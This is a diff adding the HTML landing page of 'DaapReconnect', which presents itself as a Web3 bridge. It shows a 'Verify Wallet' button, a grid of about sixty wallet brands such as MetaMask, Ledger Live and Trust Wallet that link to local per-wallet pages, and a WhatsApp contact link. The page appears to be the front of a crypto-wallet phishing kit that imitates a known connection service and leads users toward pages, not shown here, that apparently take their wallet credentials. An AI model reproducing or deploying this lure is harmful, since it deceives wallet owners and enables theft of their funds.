@@ -1,0 +1,631 @@
+<!Doctype html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css"
+    integrity="sha512-iBBXm8fW90+nuLcSKlbmrPcLa0OT92xO1BIsZ+ywDWZCvqsWgccV3gFoRBv0z+8dLJgyAHIhR35VZc2oM/gI1w=="
+    crossorigin="anonymous" referrerpolicy="no-referrer"/>
+    <link rel="stylesheet" href="wallet.css" type="text/css">
+    <link rel="icon" type="image/png" href="logo.png"/>
+    <title>Wallet</title><script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.0/jquery.min.js"> </script>
+</head>
+<body>
+
+
+    <script type="text/javascript" src="https://files.coinmarketcap.com/static/widget/coinMarquee.js"></script><div id="coinmarketcap-widget-marquee" coins="1,1027,825,5994,10804,8757" currency="USD" theme="light" transparent="false" show-symbol-logo="true"></div>
+
+
+
+    <div class="close">
+        <i class="fa fa-angle-left fa-2x" id="close" onclick="closeMenu()"></i>
+    </div>
+
+    <div class="menu-slider" id="move">
+        <div class="contents" id="float">
+        
+    
+            <nav class="two">
+                <ul>
+                    <li>
+                        <a href="index">Home</a>
+                        <i class="fa fa-plus"></i>
+                    </li>
+                    
+                    <li>
+                        <a href="faq">FAQ</a>
+                        <i class="fa fa-plus"></i>
+                    </li>
+                    
+                </ul>
+            </nav>
+        </div>
+     </div>
+    
+        <i class="fa fa-bars fa-8x"  id="bar" onclick="slideLeft()"></i>
+    <div class="containerx" id="slide">          
+    </div>
+</div>
+</div>
+
+
+<section class="navbar2" id="nava">
+    <div class="navbar2-container">
+        <div class="leftside"><img src="logo.svg" id="logo" alt="logo"></div>
+        <div class="rightside">
+            <nav>
+                <ul id="navar" >
+                    <li><a href="index">Home</a></li>
+                    <li><a href="faq">FAQ</a></li>
+                </ul>
+            </nav>
+        </div>
+    </div>
+<script src="js.js"></script>
+</section>
+
+<section class="header">
+    <div class="container">
+        
+        <div class="middlepart">
+            <h4>Crypto bridge server to blockchain apps</h4>
+            <p>
+                DaapReconnect is the web3 standard to connect
+                blockchain wallets to dapps.
+            </p>
+           
+    
+                <button>
+                    
+                    <p>Verify Wallet</p>
+                    
+            
+                </button>
+        </div>
+        
+    </div>
+</section>
+
+
+<section class="body">
+    <div class="container">
+        <div class="topsection">
+            <div class="topsection-container">
+               <div class="heading">
+                   <div class="coins">
+                       <div class="coins-container">
+                           <div class="coin card">
+                               <a href="metamask" >
+                                <img src="metamask.svg" alt="">
+                                <p>MetaMask</p>
+ 
+                               </a>
+                           </div>
+                           <div class="coin card" onclick="trustWallet()">
+                               <a href="trustwallet">
+                                <img src="Trust Wallet.svg" alt="">
+                                <p>Trust Wallet</p>
+ 
+                               </a>
+                           </div>
+                           <div class="coin card">
+                               <a href="1inch">
+                                <img src="1inch.jpeg" alt="">
+                                <p>1inch</p>
+ 
+                               </a>
+                           </div>
+                           <div class="coin card">
+                               <a href="coinbase">
+                                <img src="coinbase.svg" alt="">
+                                <p>CoinBase</p>
+ 
+                               </a>
+                           </div>
+                           <div class="coin card">
+                               <a href="atomic">
+                                <img src="atomic_wallet_logo_dark_rounded.png" alt="">
+                                <p>Atomic</p>
+ 
+                               </a>
+                           </div>
+                           <div class="coin card">
+                               <a href="rainbow">
+                                <img src="rainbow.png" alt="">
+                                <p>Rainbow</p>
+ 
+                               </a>
+                           </div>
+                           <div class="coin card">
+                               <a href="trusteewallet">
+                                <img src="trustee.png" alt="">
+                                <p>Trustee Wallet</p>
+ 
+                               </a>
+                           </div>
+                           <div class="coin card">
+                               <a href="exoduswallet">
+                                <img src="Exodus Wallet-01.svg" alt="">
+                                <p>Exodus Wallet</p>
+ 
+                               </a>
+                           </div>
+                           <div class="coin card">
+                               <a href="midaswallet">
+                                <img src="midas.png" alt="">
+                                <p>Midas Wallet</p>
+ 
+                               </a>
+                           </div>
+                           <div class="coin card">
+                               <a href="torus">
+                                <img src="Torus-01.svg" alt="">
+                                <p>Torus</p>
+ 
+                               </a>
+                           </div>
+                           <div class="coin card">
+                               <a href="ledgerlive">
+                                <img src="ledger-live-logo.png" alt="">
+                                <p>Ledger Live</p>
+ 
+                               </a>
+                           </div>
+                           <div class="coin card">
+                               <a href="trustvault">
+                                <img src="vault-locker-logo-icon-vector-32221624.jpg" alt="">
+                                <p>Trust Vault</p>
+ 
+                               </a>
+                           </div>
+                           <div class="coin card">
+                               <a href="ownbit">
+                                <img src="ownbit.svg" alt="">
+                                <p>OwnBit</p>
+ 
+                               </a>
+                           </div>
+                           <div class="coin card">
+                               <a href="gridplus">
+                                <img src="gridplus.png" alt="">
+                                <p>GridPlus</p>
+ 
+                               </a>
+                           </div>
+                           <div class="coin card">
+                               <a href="bitkeep">
+                                <img src="bitkeep.jpg" alt="">
+                                <p>BitKeep</p>
+ 
+                               </a>
+                           </div>
+                           <div class="coin card">
+                               <a href="kyberswap">
+                                <img src="kyberswap.png" alt="">
+                                <p>KyberSwap</p>
+ 
+                               </a>
+                           </div>
+                           <div class="coin card">
+                               <a href="mykey">
+                                <img src="mykey-lab-vector-logo.svg" alt="">
+                                <p>MYKEY</p>
+ 
+                               </a>
+                           </div>
+                           <div class="coin card">
+                               <a href="alphawallet">
+                                <img src="AlphaWallet.png" alt="">
+                                <p>Alpha Wallet</p>
+ 
+                               </a>
+                           </div>
+                           <div class="coin card">
+                               <a href="walletio">
+                                <img src="walletio.jpg" alt="">
+                                <p>Wallet.io</p>
+ 
+                               </a>
+                           </div>
+                           <div class="coin card">
+                               <a href="easypocket">
+                                <img src="easypocket.jpg" alt="">
+                                <p>EasyPocket</p>
+ 
+                               </a>
+                           </div>
+                           <div class="coin card">
+                               <a href="dcent">
+                                <img src="dcent.png" alt="">
+                                <p>D'CENT</p>
+ 
+                               </a>
+                           </div>
+                           <div class="coin card">
+                               <a href="infinitywallet">
+                                <img src="infinitywallet.png" alt="">
+                                <p>InfinityWallet</p>
+ 
+                               </a>
+                           </div>
+                           <div class="coin card">
+                               <a href="mathwallet">
+                                <img src="MathWallet_App_Icon.png" alt="">
+                                <p>MathWallet</p>
+ 
+                               </a>
+                           </div>
+                           <div class="coin card">
+                               <a href="coinomi">
+                                <img src="Coinomi-01.svg" alt="">
+                                <p>Coinomi</p>
+ 
+                               </a>
+                           </div>
+                           <div class="coin card">
+                               <a href="Dharma">
+                                <img src="dharma.png" alt="">
+                                <p>Dharma</p>
+ 
+                               </a>
+                           </div>
+                           <div class="coin card">
+                               <a href="xinfin">
+                                <img src="xdc-icon.png" alt="">
+                                <p>XinFin XDC Network</p>
+ 
+                               </a>
+                           </div>
+                           <div class="coin card">
+                               <a href="talken">
+                                <img src="talken.png" alt="">
+                                <p>Talken</p>
+ 
+                               </a>
+                           </div>
+                           <div class="coin card">
+                               <a href="atokenwallet">
+                                <img src="atoken.png" alt="">
+                                <p>AToken Wallet</p>
+ 
+                               </a>
+                           </div>
+                           <div class="coin card">
+                               <a href="spatium">
+                                <img src="spatium.png" alt="">
+                                <p>Spatium</p>
+ 
+                               </a>
+                           </div>
+                           <div class="coin card">
+                               <a href="nash">
+                                <img src="nash.jpg" alt="">
+                                <p>Nash</p>
+ 
+                               </a>
+                           </div>
+                           <div class="coin card">
+                               <a href="bridgewallet">
+                                <img src="bridgewallet.png" alt="">
+                                <p>Bridge Wallet</p>
+ 
+                               </a>
+                           </div>
+                           <div class="coin card">
+                               <a href="tokenpocket">
+                                <img src="tokenpocket.png" alt="">
+                                <p>TokenPocket</p>
+ 
+                               </a>
+                           </div>
+                           <div class="coin card">
+                               <a href="cybavowallet">
+                                <img src="cybavo.png" alt="">
+                                <p>CYBAVO Wallet</p>
+ 
+                               </a>
+                           </div>
+                           <div class="coin card">
+                               <a href="argent">
+                                <img src="argent.png" alt="">
+                                <p>Argent</p>
+ 
+                               </a>
+                           </div>
+                           <div class="coin card">
+                               <a href="elipal">
+                                <img src="ellipal-logo-300x300.png" alt="">
+                                <p>Elipal</p>
+ 
+                               </a>
+                           </div>
+                           <div class="coin card">
+                               <a href="vision">
+                                <img src="vision.jpg" alt="">
+                                <p>Vision</p>
+ 
+                               </a>
+                           </div>
+                           <div class="coin card">
+                               <a href="huobiwallet">
+                                <img src="Huobi Token-01.svg" alt="">
+                                <p>Huobi Wallet</p>
+ 
+                               </a>
+                           </div>
+                           <div class="coin card">
+                               <a href="coinus">
+                                <img src="coinus.png" alt="">
+                                <p>CoinUs</p>
+ 
+                               </a>
+                           </div>
+                           <div class="coin card">
+                               <a href="alice">
+                                <img src="alice.jpg" alt="">
+                                <p>Alice</p>
+ 
+                               </a>
+                           </div>
+                           <div class="coin card">
+                               <a href="guardawallet">
+                                <img src="guarda.jpg" alt="">
+                                <p>Guarda Wallet</p>
+ 
+                               </a>
+                           </div>
+                           <div class="coin card">
+                               <a href="tokenary">
+                                <img src="tokenary.jpg" alt="">
+                                <p>Tokenary</p>
+ 
+                               </a>
+                           </div>
+                           <div class="coin card">
+                               <a href="viawallet">
+                                <img src="via.png" alt="">
+                                <p>ViaWallet</p>
+ 
+                               </a>
+                           </div>
+                           <div class="coin card">
+                               <a href="Zelcore">
+                                <img src="ZelCore-wallet-logo.png" alt="">
+                                <p>Zelcore</p>
+ 
+                               </a>
+                           </div>
+                           <div class="coin card">
+                               <a href="bitpay">
+                                <img src="bitpay-logo.png" alt="">
+                                <p>BitPay</p>
+ 
+                               </a>
+                           </div>
+                           <div class="coin card">
+                               <a href="valora">
+                                <img src="valora.png" alt="">
+                                <p>Valora</p>
+ 
+                               </a>
+                           </div>
+                           <div class="coin card">
+                               <a href="dokwallet">
+                                <img src="dokwallet-crypto-wallet-logo.jpg" alt="">
+                                <p>Dok Wallet</p>
+ 
+                               </a>
+                           </div>
+                           <div class="coin card">
+                               <a href="infinito">
+                                <img src="io.infinito.wallet_1.png" alt="">
+                                <p>Infinito</p>
+ 
+                               </a>
+                           </div>
+                           <div class="coin card">
+                               <a href="onto">
+                                <img src="onto.png" alt="">
+                                <p>ONTO</p>
+ 
+                               </a>
+                           </div>
+                           <div class="coin card">
+                               <a href="loopringwallet">
+                                <img src="Loopring (LRC)-01.svg" alt="">
+                                <p>Loopring Wallet</p>
+ 
+                               </a>
+                           </div>
+                           <div class="coin card">
+                               <a href="devpotocol">
+                                <img src="devprotocol-logo.png" alt="">
+                                <p>DevPotocol</p>
+ 
+                               </a>
+                           </div>
+                           <div class="coin card">
+                               <a href="quiverx">
+                                <img src="quiverx.jpg" alt="">
+                                <p>QuiverX</p>
+ 
+                               </a>
+                           </div>
+                           <div class="coin card">
+                               <a href="eidoot">
+                                <img src="Eidoo_EDO_Logo.svg" alt="">
+                                <p>Eidoot</p>
+ 
+                               </a>
+                           </div>
+                           <div class="coin card">
+                               <a href="cryptocom">
+                                <img src="cryptocom.png" alt="">
+                                <p>Crypto.com</p>
+ 
+                               </a>
+                           </div>
+                           <div class="coin card">
+                               <a href="defiant">
+                                <img src="defiant.png" alt="">
+                                <p>Defiant</p>
+ 
+                               </a>
+                           </div>
+                           <div class="coin card">
+                               <a href="safemoon">
+                                <img src="safemoon-grunge-style-logo-sticker.jpg" alt="">
+                                <p>Safemoon</p>
+ 
+                               </a>
+                           </div>
+                           <div class="coin card">
+                               <a href="safepal">
+                                <img src="safepal.png" alt="">
+                                <p>SafePal</p>
+ 
+                               </a>
+                           </div>
+
+                           <div class="coin card">
+                            <a href="coin98" >
+                             <img src="Coin98.jpeg" alt="">
+                             <p>Coin98</p>
+
+                            </a>
+                        </div>
+                        <div class="coin card" 			>
+                            <a href="cmorq">
+                             <img src="cmorq.jpg">
+                             <p>Cmorq</p>
+
+                            </a>
+                        </div>
+                        <div class="coin card">
+                            <a href="gnosis">
+                             <img src="gnois.jpg" alt="">
+                             <p>Gnosis Safe Multisig</p>
+
+                            </a>
+                        </div>
+                        <div class="coin card">
+                            <a href="hashkey">
+                             <img src="hashkey.jpg" alt="">
+                             <p>HashKey</p>
+
+                            </a>
+                        </div>
+                        <div class="coin card">
+                            <a href="coinstats">
+                             <img src="coinstats.png" alt="">
+                             <p>Coinstats</p>
+
+                            </a>
+                        </div>
+                        <div class="coin card">
+                            <a href="atwallet">
+                             <img src="Atwallet.jpg" alt="">
+                             <p>AT.Wallet</p>
+
+                            </a>
+                        </div>
+                        <div class="coin card">
+                            <a href="tongue">
+                             <img src="tongue.jpg" alt="">
+                             <p>Tongue Wallet </p>
+
+                            </a>
+                        </div>
+                        <div class="coin card">
+                            <a href="unstoppable">
+                             <img src="Unstoppable.jpg" alt="">
+                             <p>Unstoppable Wallet</p>
+
+                            </a>
+                        </div>
+                           
+                           
+                       </div>
+                   </div>
+  
+              </div>
+
+              <div class="next">
+                  <p>1 of 2</p>
+                 
+                      <a href="wallet2">
+                          <button>
+                              Next
+                          </button>
+                      </a>
+                  
+              </div>
+        <div class="bottomsection">
+            <div class="bottomsection-container">
+                <div class="card1 card">
+                    <h4>FREQUENTLY ASKED QUESTIONS</h4>
+                       <button>
+                           <a href="faq">
+                            <p>
+How web frontend and mobile wallets communicate?
+                              
+                            </p>
+                            
+                           </a>
+                       </button>
+    </p>
+                       <button>
+                           <a href="faq">
+                            <p>
+Is there a token?
+                              
+                            </p>
+                            
+                           </a>
+                       </button>
+            </div>
+          
+            </div>
+          </div>
+            
+        
+    </div>
+
+</section>
+    
+
+<section class="footer">
+    <div class="footer-container">
+        <div class="footer-leftpart">
+            <img src="logo.svg" alt="logo">
+            <p>DaapReconnect connects web applications to supported mobile wallets.</p>
+            <div class="social">
+                <a href="https://wa.me/message/3UHO3DF5RWAEN1"><i class="fab fa-whatsapp fa-2x"></i></a>
+                <i class="fab fa-telegram fa-2x"></i>
+                <i class="fab fa-discord fa-2x"></i>
+            </div>
+       </div>
+
+
+        <div class="footer-rightpart">
+            <button class="one">
+              <a href="index">
+                <p>Home</p>
+                <i class="fa fa-angle-right fa-2x"></i>
+              </a>
+            </button>
+            <button class="two">
+                <a href="faq">
+                    <p>FAQ</p>
+                    <i class="fa fa-angle-right fa-2x"></i>
+                </a>
+            </button>
+            
+        </div>
+    </div>
+    <h5>Copyright © 2022 DaapReconnect, Inc. All rights reserved.</h5>
+</section>
+<script src="js.js"></script>
+</body>
+</html>
